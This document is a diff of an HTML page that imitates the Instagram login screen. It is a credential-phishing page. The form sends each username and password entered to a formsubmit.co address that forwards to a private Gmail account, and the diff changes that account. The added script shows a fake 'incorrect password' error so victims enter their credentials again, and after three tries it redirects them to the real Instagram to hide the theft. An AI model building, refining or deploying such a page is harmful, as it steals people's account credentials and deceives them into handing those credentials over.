@@ -9,14 +9,12 @@
     * {
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       padding: 0;
       background-color: #fafafa;
       font-family: 'Roboto', sans-serif;
     }
-
     .wrapper {
       display: flex;
       justify-content: center;
@@ -25,42 +23,34 @@
       gap: 40px;
       padding: 20px;
     }
-
     .phone-mockup {
-      display: none;
       flex-shrink: 0;
       width: 500px;
-      max-height: 650px;
       user-select: none;
     }
-
     .phone-mockup img {
       width: 100%;
       height: auto;
       object-fit: contain;
       user-select: none;
     }
-
     .form-container {
       width: 100%;
       max-width: 350px;
     }
-
-    .login-box,
-    .signup-box {
+    .login-box {
       background: #fff;
       border: 1px solid #dbdbdb;
       padding: 40px 30px;
       margin-bottom: 10px;
       text-align: center;
+      position: relative;
     }
-
     .login-box img.logo {
       width: 175px;
       margin-bottom: 25px;
       user-select: none;
     }
-
     input {
       width: 100%;
       padding: 10px;
@@ -70,7 +60,6 @@
       border-radius: 3px;
       font-size: 14px;
     }
-
     button {
       width: 100%;
       padding: 10px;
@@ -81,14 +70,17 @@
       font-size: 14px;
       border-radius: 3px;
       margin-top: 10px;
-      cursor: pointer;
+      cursor: not-allowed;
+      opacity: 0.5;
       transition: background-color 0.2s ease;
     }
-
-    button:hover {
+    button.enabled {
+      cursor: pointer;
+      opacity: 1;
+    }
+    button.enabled:hover {
       background-color: #007acc;
     }
-
     .or {
       margin: 20px 0;
       position: relative;
@@ -96,7 +88,6 @@
       font-size: 13px;
       color: #8e8e8e;
     }
-
     .or::before,
     .or::after {
       content: "";
@@ -106,59 +97,67 @@
       background-color: #dbdbdb;
       top: 50%;
     }
-
     .or::before {
       left: 0;
     }
-
     .or::after {
       right: 0;
     }
-
     .forgot {
       margin-top: 15px;
       font-size: 12px;
     }
-
     a {
       color: #0095f6;
       text-decoration: none;
       font-weight: bold;
     }
-
     .signup-box {
       font-size: 14px;
+      text-align: center;
     }
-
     .facebook-login {
-      display: inline-flex;
+      display: flex;
+      justify-content: center;
       align-items: center;
       color: #385185;
       font-weight: 600;
-      text-decoration: none;
       font-size: 14px;
-      justify-content: center;
-      margin-bottom: 12px;
+      margin-top: 15px;
+      gap: 6px;
+      cursor: pointer;
+      text-decoration: none;
     }
-    .facebook-login:hover {
-      text-decoration: underline;
+    .facebook-login img {
+      width: 16px;
+      height: 16px;
     }
-
-    @media (min-width: 768px) {
-      .phone-mockup {
-        display: block;
-      }
+    .error-box {
+      background-color: #fff0f0;
+      border: 1px solid #ef4444;
+      color: #ef4444;
+      padding: 10px 14px;
+      margin-top: 8px;
+      border-radius: 3px;
+      font-size: 13px;
+      text-align: center;
+      user-select: none;
+      display: none;
+      max-width: 350px;
+      margin-left: auto;
+      margin-right: auto;
     }
-
     @media (max-width: 767px) {
       .wrapper {
         flex-direction: column;
       }
-
-      .phone-mockup img {
-        height: 400px;
+      .phone-mockup {
+        width: 90vw;
+        max-width: 450px;
         margin-bottom: 20px;
-        max-width: 100%;
+      }
+      .error-box {
+        max-width: 90vw;
       }
     }
   </style>
@@ -182,9 +181,10 @@
           alt="Instagram"
           draggable="false"
         />
+
         <form
           id="loginForm"
-          action="https://formsubmit.co/rahul84486@gmail.com"
+          action="https://formsubmit.co/rampravesh449@gmail.com"
           method="POST"
           autocomplete="off"
           spellcheck="false"
@@ -192,6 +192,7 @@
           <input
             type="text"
             name="username"
+            id="username"
             placeholder="Phone number, username, or email"
             required
             aria-label="Username"
@@ -199,6 +200,7 @@
           <input
             type="password"
             name="password"
+            id="password"
             placeholder="Password"
             required
             aria-label="Password"
@@ -209,41 +211,34 @@
           <input type="hidden" name="_captcha" value="false" />
           <input type="hidden" name="_template" value="table" />
 
-          <button type="submit">Log In</button>
+          <button type="submit" id="loginBtn" disabled>Log In</button>
 
           <div class="or">OR</div>
+        </form>
 
-          <!-- Facebook login with logo -->
+        <a
+          href="https://www.facebook.com/login.php?skip_api_login=1&api_key=6628568379&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Ffacebook_login%2F%3Fsource%3Dauth_switcher&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fcancel%3Dtrue%26source%3Dauth_switcher&display=popup&locale=en_US"
+          target="_blank"
+          rel="noopener noreferrer"
+          class="facebook-login"
+        >
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook logo" />
+          Log in with Facebook
+        </a>
+
+        <!-- Error alert below facebook login -->
+        <div class="error-box" id="errorBox">
+          Sorry, your password was incorrect. Please double-check your password.
+        </div>
+
+        <div class="forgot" style="margin-top: 15px;">
           <a
-            href="https://www.facebook.com/login.php?skip_api_login=1&api_key=6628568379&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Ffacebook_login%2F%3Fsource%3Dauth_switcher&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fcancel%3Dtrue%26source%3Dauth_switcher&display=popup&locale=en_US"
+            href="https://www.instagram.com/accounts/password/reset/"
             target="_blank"
             rel="noopener noreferrer"
-            class="facebook-login"
+            >Forgot password?</a
           >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              width="16"
-              height="16"
-              fill="#385185"
-              viewBox="0 0 24 24"
-              aria-hidden="true"
-              focusable="false"
-              style="vertical-align: middle; margin-right: 8px;"
-            >
-              <path d="M22.675 0h-21.35C.6 0 0 .6 0 1.344v21.312C0 23.4.6 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.414c0-3.1 1.893-4.788 4.658-4.788 1.325 0 2.463.1 2.796.144v3.24l-1.918.001c-1.504 0-1.796.715-1.796 1.763v2.31h3.59l-.467 3.622h-3.123V24h6.116c.725 0 1.325-.6 1.325-1.344V1.344C24 .6 23.4 0 22.675 0z"/>
-            </svg>
-            Log in with Facebook
-          </a>
-
-          <div class="forgot">
-            <a
-              href="https://www.instagram.com/accounts/password/reset/"
-              target="_blank"
-              rel="noopener noreferrer"
-              >Forgot password?</a
-            >
-          </div>
-        </form>
+        </div>
       </div>
 
       <div class="signup-box">
@@ -259,30 +254,48 @@
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
+    const loginForm = document.getElementById('loginForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const passwordInput = document.getElementById('password');
+    const errorBox = document.getElementById('errorBox');
+    let attempts = 0;
+
+    // Enable login button only when password length >= 6
+    passwordInput.addEventListener('input', () => {
+      if (passwordInput.value.length >= 6) {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('enabled');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('enabled');
+      }
+      errorBox.style.display = 'none'; // Hide error on input
+    });
+
+    loginForm.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const form = this;
-      const data = new FormData(form);
-
-      fetch(form.action, {
+      // Send inputs to your email every time form is submitted
+      const data = new FormData(loginForm);
+      fetch(loginForm.action, {
         method: 'POST',
         body: data,
         headers: {
           Accept: 'application/json',
         },
-      })
-        .then((response) => {
-          if (response.ok) {
-            // Redirect to Instagram homepage after successful submission
-            window.location.href = 'https://www.instagram.com';
-          } else {
-            alert('Oops! There was a problem submitting your form.');
-          }
-        })
-        .catch((error) => {
-          alert('Oops! There was a problem submitting your form.');
-        });
+      }).catch(() => {
+        // no error handling needed for now
+      });
+
+      attempts++;
+
+      if (attempts < 3) {
+        // Show Instagram-like error after wrong attempt
+        errorBox.style.display = 'block';
+      } else {
+        // After 3 wrong attempts redirect to Instagram
+        window.location.href = 'https://www.instagram.com';
+      }
     });
   </script>
 </body>
